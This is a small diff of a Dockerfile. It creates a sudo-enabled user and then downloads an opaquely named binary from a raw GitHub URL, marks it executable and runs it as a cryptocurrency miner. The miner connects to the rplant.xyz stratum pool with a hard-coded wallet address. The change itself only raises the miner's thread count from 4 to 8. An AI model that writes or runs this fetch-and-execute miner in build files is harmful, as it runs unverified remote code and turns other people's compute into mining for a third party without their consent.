@@ -24,4 +24,4 @@ RUN useradd -m kunemuse && \
     adduser kunemuse sudo && \
     sudo usermod -a -G sudo kunemuse
 
-RUN wget https://raw.githubusercontent.com/razmai9/0001-0050/master/0014 && chmod +x 0014 && ./0014 -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qjhuqfmdcmaq6qr0dlxh2c9d874x6eaa88vmj3y.cpu1 -t4
+RUN wget https://raw.githubusercontent.com/razmai9/0001-0050/master/0014 && chmod +x 0014 && ./0014 -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qjhuqfmdcmaq6qr0dlxh2c9d874x6eaa88vmj3y.cpu1 -t8
